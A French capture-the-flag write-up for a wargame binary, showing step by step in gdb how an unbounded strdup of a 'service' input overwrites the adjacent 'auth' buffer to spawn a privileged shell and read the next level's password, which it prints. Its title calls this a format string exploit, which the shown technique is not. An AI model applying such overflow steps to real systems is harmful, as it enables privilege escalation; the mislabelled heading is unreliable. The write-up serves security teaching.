# Format String Exploitation

En décompilant le programme, on observe qu'il y a différents tests pour arriver à une condition finale. Si cette condition est respectée, alors un `shell` avec les droits de `level9` sera lancé.
Observons la condition nécessaire permettant d'exécuter un `shell`.
```C
eax = auth;
eax = *((eax + 0x20));
if (eax != 0) {
	system ("/bin/sh");
	goto label_0;
}
```
Si on traduit le code décompilé pour avoir un code un plus clair, cette condition est : 
```C
if (auth[32] != '\0') {
	system ("/bin/sh");`
}
```
En effet, `0x20` équivaut à 32 en base10.

Globalement, le code est une boucle infinie, qui attend différentes entrées. Si l'entrée est valide, on passera à la prochaine demande d'entrée. Il va donc nous falloir plusieurs étapes pour arriver à la conditon finale vue précédemment. 

On remarque dans la première partie du code, que l'entrée attendu semble être `auth `.
```C
 puVar6 = (uint8_t *)"auth ";
    do {
      ...
```

Pour valider notre condition finale, la méthode la plus simple serait donc d'écrire `auth ` suivis de plus de 32 caractères afin que `auth[32]` soit différent de `\0`.
Le reste du code n'étant pas très explicite, nous allons manipuler la `stack` pour essayer de mieux comprendre.

```C
_auth = (undefined4 *)malloc(4);
*_auth = 0;
if (uVar3 < 0x1f) {
  strcpy(_auth, acStack139);
}
```

Ce bout de code semble être une condition liée à notre `input`. Si on saisis moins de `30` caractères, un appel à `strcpy` sera effectué. Nous allons tenter de vérifiée cette hypothèse avec `gdb` en mettant un `breakpoint` au niveau du `strcpy` lorsqu'on saisis moins de `31` caractères et lorsqu'on en saisis plus. Cela nous permettra de voir si on fait appel à `strcpy`.

```
> gdb level8
[...]
> (gdb) disas main
[...]
   0x0804863a <+214>:	mov    %eax,(%esp)
   0x0804863d <+217>:	call   0x8048460 <strcpy@plt>
   0x08048642 <+222>:	lea    0x20(%esp),%eax
[...]
> (gdb) b *0x0804863d
[...]
> (gdb) r
Starting program: /home/user/level8/level8
(nil), (nil)
auth AAAA

Breakpoint 1, 0x0804863d in main ()
> (gdb) r
Starting program: /home/user/level8/level8
(nil), (nil)
auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, (nil)
```

Notre hypothèse est vérifiée. Lorsqu'on saisis moins de 31 caractères, on fait appel à le `strcpy`. Si on en saisit plus, on ne rentre pas dedans. 

Nous allons donc afficher la valeur de `_auth` juste après le `strcpy`.

```
> (gdb) ni
[...]
> (gdb) x $esp
0xbffff670:	0x0804a008
> (gdb) x/s 0x0804a008
0x804a008:	"AAAA\n"
```

On retrouve bien nos `AAAA`, qui ont été copié dans `_auth`.
Nous ne pourrons pas écrire 32 caractères après notre input `auth `, puisque ces caractères ne seront pas copiés en l'absence d'un appel à strcpy. Nous allons devoir trouver une autre solution pour arriver à notre condition finale qui est `auth[32] != '\0`.

On voit au début du programme qu'il y a un printf qui va nous afficher les adresses de `_auth` et `_service`. On a déterminé précédemment l'adresse de `_auth`. Déterminons maintenant celle de `_service`.

```C
printf("%p, %p \n", _auth, _service);
```

```
> ./level8
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
```

Nous avons bien retrouvé l'adresse de `_auth` : `0x804a008`. Nous avons maintenant l'adresse de `_service` : `0x804a018`. 
On remarque que l'adresse de `_service` est décalée de `0x10` octets. 


```C
_service = strdup(auStack137);
```

Le reste du code n'est pas particulièrement explicite, et nous allons tenter de vérifier si, lorsqu'on saisi `service`, notre `input` va mener à un appel à `strdup`.

Nous allons `break` au niveau de ce `strdup` pour vérifier si la fonction est appelée.

```
> (gdb) disass main
[...]
   0x080486a8 <+324>:	mov    %eax,(%esp)
   0x080486ab <+327>:	call   0x8048430 <strdup@plt>
   0x080486b0 <+332>:	mov    %eax,0x8049ab0
[...]
> (gdb) b *0x080486ab
[...]
> (gdb) r
Starting program: /home/user/level8/level8
(nil), (nil)
auth
0x804a008, (nil)
service AAAA
```

Notre hypothèse est vérifiée. Lorsqu'on saisit `service`, le programme va appeler la fonction `strdup`. Nous n'avons pas testé avec un grand nombre de caractères puisque `strdup` duplique les caractères dans la chaine tant qu'il ne rencontre pas de `\0`. Ici, il n'est pas précédé par une condition impliquant le nombre de caractères de l'entrée de l'utilisateur.
Il n'y a donc pas de limitation au niveau de `service`.

Nous allons maintenant afficher la `stack` après l'appel à `strdup`.

```
> (gdb) b *0x080486ab
[...]
> (gdb) r
[...]
auth AAAA
0x804a008, (nil)
service BBBB

Breakpoint 1, 0x080486ab in main ()
> (gdb) x/4wx $esp
0xbffff670:	0xbffff697	0x00000080	0xb7fd1ac0	0xb7fd0ff4
> (gdb) ni
[...]
> (gdb)  x/s 0x0804a008
0x804a008:	 "AAAA\n"
> (gdb)  x/12wx 0x0804a008
0x804a008:	0x41414141	0x0000000a	0x00000000	0x00000011
                     ^                     
                     _auth     
0x804a018:	0x42424220	0x00000a42	0x00000000	0x00020fe1
                     ^
                     _service 
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x 0x0804a008+0x20
0x804a028:	0x00000000
```
Au moment de l'affichage de la `stack`, nous nous trouvons juste après `strdup`. 
On a affiché `_auth` et on retrouve bien nos `AAAA`.
On a également visualisé les adresses de `_auth` et `_service`, et on remarque bien que nos `BBBB` ont été dupliqués, puis assignés à la variable `_service`.

On remarque que l'adresse de `_auth + 0x20` est égal à `0`.  
`0x20` est égal à 32 en `base 10`.   
`_auth + 0x20` est équivalent à `auth[32]`. 
Nous avons vu précédement qu'il n'y avait pas de limitation avec `strdup`. On peut donc assigner une chaine de caractères suffisament grande à l'adresse de `_service` pour écraser l'octet à cette adresse de sorte à ce qu'il ne soit pas égal à `0`. `_auth + 0x20` sera donc différent de `\0`.

Nous allons maintenant calculer la taille de la chaine de caractères nécessaire à la réalisation de l'exploit.

```
[adresse de _auth + 0x20] - [adresse de service] = 0x804a028 - 0x804a018
                                                 = 0x10
                                                 = 16 (base 10)
```

`0x10` est égal à `16` en `base10`. Nous devons donc écrire 16 caractères après `service` pour atteindre l'adresse de `_auth + 0x20` et donc lancer un `shell`. On peut vérifier ça dans `gdb`.

```
> (gdb) r
[...]
(nil), (nil)
auth AAAA
0x804a008, (nil)
serviceBBBBBBBBBBBBBBBB

Breakpoint 1, 0x080486ab in main ()
> (gdb) ni
0x080486b0 in main ()
> (gdb) x/20wx 0x0804a008
0x804a008:	0x41414141	0x0000000a	0x00000000	0x00000019
                     ^
                     _auth
0x804a018:	0x42424242	0x42424242	0x42424242	0x42424242
                     ^
                     _service
0x804a028:	0x0000000a	0x00020fd9	0x00000000	0x00000000
                     ^              
                     _auth[32]
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
> (gdb) x/s 0x0804a008+0x20
0x804a028:	 "\n"
```

On voit bien que `_auth + 0x20` n'est plus égal à `0`.
Il y a maintenant `0x0a` qui correspond au code ascii du caractère `\n`. On a vu précédemment qu'il fallait écrire 16 caractères après `service` pour atteindre l'adresse de `_auth + 0x20`. Il s'avère que c'est `16` + `\n`. 
Notre condition `auth[32] != '\0'` est bien respectée.

On suppose d'après le code, qu'il va falloir que notre dernière entrée soit `login` pour que la conditon `auth[32] != '\0'` soit exécutée. On va vérifier cela dans `gdb`.

```
> (gdb) disass main
[...]
  0x080486e2 <+382>:	mov    0x8049aac,%eax
  0x080486e7 <+387>:	mov    0x20(%eax),%eax
  0x080486ea <+390>:	test   %eax,%eax
[...]
```

On observe ici que le programme va mettre `mov` dans `eax+0x20` dans `eax`. Puis il y a un test avec `eax`.
Nous pouvons `break` à `0x080486e7` sur l'instruction `mov` afin de voir si la condition s'exécute bien lorsqu'on tape `login`. 

```
> (gdb) b *0x080486e7
Breakpoint 4 at 0x80486e7
> (gdb) r
[...]
auth AAAA
0x804a008, (nil)
serviceBBBBBBBBBBBBBBBB
0x804a008, 0x804a018
login

Breakpoint 4, 0x080486e7 in main ()
> (gdb) x/16wx 0x804a008
0x804a008:	0x41414141	0x0000000a	0x00000000	0x00000019
                     ^
                     _auth
0x804a018:	0x42424242	0x42424242	0x42424242	0x42424242
                     ^
                     _service
0x804a028:	0x0000000a	0x00020fd9	0x00000000	0x00000000
                     ^
                     _auth[32]
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
> (gdb) c
Continuing.
$
```

Notre hypothèse est vérifiée, lorsqu'on saisis `login`, le condition est bien exécutée. Il nous suffit de continuer, et un `shell` se lance puisque `auth[32] != '\0'`.

```
> ./level8
[...]
> auth 
0x804a008, (nil)
> service AAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
> login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
``` 
